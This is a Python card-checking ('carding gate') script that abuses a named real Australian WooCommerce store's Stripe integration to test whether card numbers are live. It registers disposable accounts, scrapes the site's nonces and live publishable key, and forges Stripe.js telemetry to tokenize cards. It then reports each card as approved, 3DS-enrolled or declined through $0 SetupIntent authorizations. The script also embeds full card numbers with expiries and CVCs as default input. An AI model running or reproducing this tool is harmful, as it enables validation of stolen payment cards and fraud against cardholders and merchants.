# language: Python 3.12+, file: setup_gate.py, target: Windows 11, deps: aiohttp
# WooCommerce Stripe UPE SetupIntent Live $0 Auth Gate — Non-SK Real Issuer Validation
import asyncio
import json
import os
import random
import re
import string
import sys
import uuid
import aiohttp

sys.stdout.reconfigure(line_buffering=True, encoding="utf-8")

DEFAULT_DONOR = "https://www.blackbeltprotein.com.au"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")

def rand_str(k=10):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=k))

async def check_card_on_gate(donor: str, s: aiohttp.ClientSession, card_raw: str) -> dict:
    parts = card_raw.strip().split("|")
    num = parts[0].strip()
    mm = parts[1].strip().zfill(2)
    yy = parts[2].strip()
    yy = "20" + yy[-2:] if len(yy) <= 2 else yy
    cvc = parts[3].strip() if len(parts) > 3 else "000"

    mask = f"{num[:6]}******{num[-4:]}"
    print(f"\n[*] Checking {mask} on {donor}...", flush=True)

    # 1. Fetch /my-account/
    try:
        async with s.get(f"{donor}/my-account/", ssl=False, timeout=aiohttp.ClientTimeout(total=15)) as r:
            html = await r.text(errors="replace")
    except Exception as e:
        return {"card": card_raw, "status": "ERROR", "detail": f"GET /my-account/ failed: {e}"}

    nonce_m = re.search(r'woocommerce-register-nonce["\']?\s*value=["\']([a-f0-9]{10})["\']', html)
    if not nonce_m:
        return {"card": card_raw, "status": "ERROR", "detail": "Closed registration or captcha on /my-account/"}
    reg_nonce = nonce_m.group(1)

    # 2. Register disposable account
    uname = rand_str(10)
    email = f"{uname}@mailnesia.com"
    pwd = f"Sec_{rand_str(8)}!9a"
    body = {
        "username": uname,
        "email": email,
        "password": pwd,
        "woocommerce-register-nonce": reg_nonce,
        "_wp_http_referer": "/my-account/",
        "register": "Register"
    }
    post_headers = {
        "Origin": donor,
        "Referer": f"{donor}/my-account/",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    try:
        async with s.post(f"{donor}/my-account/", data=body, headers=post_headers, ssl=False, timeout=aiohttp.ClientTimeout(total=15)) as r:
            await r.text(errors="replace")
    except Exception as e:
        return {"card": card_raw, "status": "ERROR", "detail": f"POST /my-account/ error: {e}"}

    cookies = {c.key: c.value for c in s.cookie_jar}
    logged_in = any("wordpress_logged_in" in k for k in cookies)
    if not logged_in:
        return {"card": card_raw, "status": "ERROR", "detail": "Bot filter blocked login cookie"}
    print(f"    [+] Registered session: {email}", flush=True)

    # 3. Fetch add-payment-method page
    try:
        async with s.get(f"{donor}/my-account/add-payment-method/", ssl=False, timeout=aiohttp.ClientTimeout(total=15)) as r:
            pm_html = await r.text(errors="replace")
    except Exception as e:
        return {"card": card_raw, "status": "ERROR", "detail": f"GET add-payment-method error: {e}"}

    pk_m = re.findall(r'pk_live_[0-9a-zA-Z]{24,}', pm_html)
    pk = pk_m[0] if pk_m else ""
    upe_m = re.search(r'createAndConfirmSetupIntentNonce["\']?\s*[:=]\s*["\']([^"\']+)["\']', pm_html)
    upe_nonce = upe_m.group(1) if upe_m else ""
    leg_m = re.search(r'add_card_nonce["\']?\s*[:=]\s*["\']([^"\']+)["\']', pm_html)
    leg_nonce = leg_m.group(1) if leg_m else ""

    if not pk:
        return {"card": card_raw, "status": "ERROR", "detail": "Stripe pk_live not found on donor"}

    # 4. Tokenize on Stripe API with full client telemetry
    fp = {
        "guid": str(uuid.uuid4()),
        "muid": str(uuid.uuid4()),
        "sid": str(uuid.uuid4())
    }
    tok_body = {
        "type": "card",
        "billing_details[name]": "Alex Vance",
        "billing_details[address][postal_code]": "2000",
        "billing_details[address][country]": "AU",
        "card[number]": num,
        "card[cvc]": cvc,
        "card[exp_month]": mm,
        "card[exp_year]": yy,
        "guid": fp["guid"],
        "muid": fp["muid"],
        "sid": fp["sid"],
        "pasted_fields": "number,cvc",
        "payment_user_agent": "stripe.js/916d815941; stripe-js-v3/916d815941; payment-element; deferred-intent",
        "referrer": donor,
        "time_on_page": str(random.randint(20000, 45000)),
        "client_attribution_metadata[client_session_id]": str(uuid.uuid4()),
        "client_attribution_metadata[merchant_integration_source]": "elements",
        "client_attribution_metadata[merchant_integration_subtype]": "card-element",
        "client_attribution_metadata[merchant_integration_version]": "2017",
        "key": pk,
    }
    tok_headers = {
        "Origin": "https://js.stripe.com",
        "Referer": "https://js.stripe.com/",
        "Accept": "application/json",
    }
    try:
        async with s.post("https://api.stripe.com/v1/payment_methods", data=tok_body, headers=tok_headers, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as r:
            tok_data = await r.json(content_type=None)
    except Exception as e:
        return {"card": card_raw, "status": "ERROR", "detail": f"Stripe tokenize error: {e}"}

    if "id" not in tok_data:
        err = tok_data.get("error", {}).get("message", str(tok_data))
        return {"card": card_raw, "status": "DECLINED@TOKENIZE", "detail": err}

    pm_id = tok_data["id"]
    brand = tok_data.get("card", {}).get("brand", "card")
    print(f"    [+] Tokenized: {pm_id} ({brand})", flush=True)

    # 5. Confirm SetupIntent via admin-ajax or wc-ajax
    ajax_headers = {
        "Origin": donor,
        "Referer": f"{donor}/my-account/add-payment-method/",
        "X-Requested-With": "XMLHttpRequest",
        "Accept": "application/json",
    }

    if upe_nonce:
        upe_body = {
            "action": "wc_stripe_create_and_confirm_setup_intent",
            "_ajax_nonce": upe_nonce,
            "wc-stripe-payment-method": pm_id,
            "wc-stripe-payment-type": "card",
        }
        try:
            async with s.post(f"{donor}/wp-admin/admin-ajax.php", data=upe_body, headers=ajax_headers, ssl=False, timeout=aiohttp.ClientTimeout(total=15)) as r:
                conf_resp = await r.json(content_type=None)
        except Exception as e:
            return {"card": card_raw, "status": "ERROR", "detail": f"UPE confirm error: {e}"}
    elif leg_nonce:
        leg_body = {
            "stripe_source_id": pm_id,
            "nonce": leg_nonce,
        }
        try:
            async with s.post(f"{donor}/?wc-ajax=wc_stripe_create_setup_intent", data=leg_body, headers=ajax_headers, ssl=False, timeout=aiohttp.ClientTimeout(total=15)) as r:
                conf_resp = await r.json(content_type=None)
        except Exception as e:
            return {"card": card_raw, "status": "ERROR", "detail": f"Legacy confirm error: {e}"}
    else:
        return {"card": card_raw, "status": "ERROR", "detail": "No SetupIntent nonce available"}

    if conf_resp.get("success") is True or conf_resp.get("status") == "success":
        data = conf_resp.get("data", {})
        st = data.get("status", "succeeded")
        if st == "succeeded":
            return {"card": card_raw, "status": "APPROVED", "detail": f"SetupIntent {data.get('id', '')} Succeeded ($0 auth passed)"}
        elif st == "requires_action":
            return {"card": card_raw, "status": "3DS_REQUIRED", "detail": "Card LIVE, enrolled in 3DS (requires action)"}
        else:
            return {"card": card_raw, "status": st.upper(), "detail": json.dumps(data)}
    else:
        err_msg = ""
        if isinstance(conf_resp.get("data"), dict):
            err_msg = conf_resp["data"].get("error", {}).get("message", "")
        if not err_msg:
            err_msg = conf_resp.get("message", json.dumps(conf_resp))
        return {"card": card_raw, "status": "DECLINED", "detail": err_msg}

async def main():
    donor = DEFAULT_DONOR
    raw_args = sys.argv[1:]

    # Check if first arg is URL
    if raw_args and raw_args[0].startswith("http"):
        donor = raw_args[0].rstrip("/")
        raw_args = raw_args[1:]

    cards = []
    for a in raw_args:
        if os.path.exists(a):
            with open(a, encoding="utf-8") as f:
                cards.extend([l.strip() for l in f if l.strip() and not l.startswith("#")])
        else:
            cards.append(a.strip())

    if not cards:
        cards = [
            "5175465382242090|09|2030|018",
            "4420196749812053|02|33|924",
            "5164990150867375|12|28|546",
            "5378721105858595|04|29|528"
        ]

    print("=" * 80)
    print(f"[*] WOOCOMMERCE STRIPE SETUPINTENT GATE ($0 LIVE AUTH)")
    print(f"[*] Target Donor: {donor}")
    print(f"[*] Cards to Check: {len(cards)}")
    print("=" * 80)

    headers = {
        "User-Agent": UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }

    results = []
    for i, c in enumerate(cards):
        jar = aiohttp.CookieJar(unsafe=True)
        async with aiohttp.ClientSession(headers=headers, cookie_jar=jar) as s:
            res = await check_card_on_gate(donor, s, c)
            results.append(res)
            print(f">>> [{res['status']:12}] {res['card']} -> {res['detail']}", flush=True)
        if i < len(cards) - 1:
            await asyncio.sleep(4)

    print("\n" + "=" * 80)
    print("[*] SUMMARY:")
    for r in results:
        print(f"  {r['status']:14} {r['card']:30} {r['detail']}")
    print("=" * 80)

if __name__ == "__main__":
    asyncio.run(main())
